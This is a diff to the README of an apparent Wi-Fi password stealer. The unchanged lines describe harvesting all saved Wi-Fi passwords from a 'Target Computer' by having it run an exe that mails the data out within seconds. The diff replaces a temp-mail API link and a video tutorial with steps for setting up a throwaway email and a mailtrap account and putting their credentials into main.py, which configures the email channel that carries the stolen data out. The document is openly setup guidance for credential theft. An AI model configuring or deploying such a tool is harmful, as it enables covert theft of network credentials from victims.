@@ -8,13 +8,13 @@ Get All Registered Wifi Passwords from Target Computer.
 Download and run exe file on Target Computer.The data will mail in 5-10 seconds.
 
 
-## USAGE TEMP MAIL API
+## USAGE TEMP MAIL
 
-### https://temp-mail.org/en/api/
+Create Temp Mail from here "https://temp-mail.org/pt" and then Enter this link "https://mailtrap.io/"and create account with Temp Mail.
+Get Username,Password (with MD5) and Paste in "main.py".Set E-MAIL to your Temp Mail.
 
-Watch the Tutorial !
-[![Watch the video](https://img.youtube.com/vi/wi9k59IGq_A/maxresdefault.jpg)](https://youtu.be/wi9k59IGq_A)
-
+### https://mailtrap.io/ 
+### https://temp-mail.org/pt
 
 
 
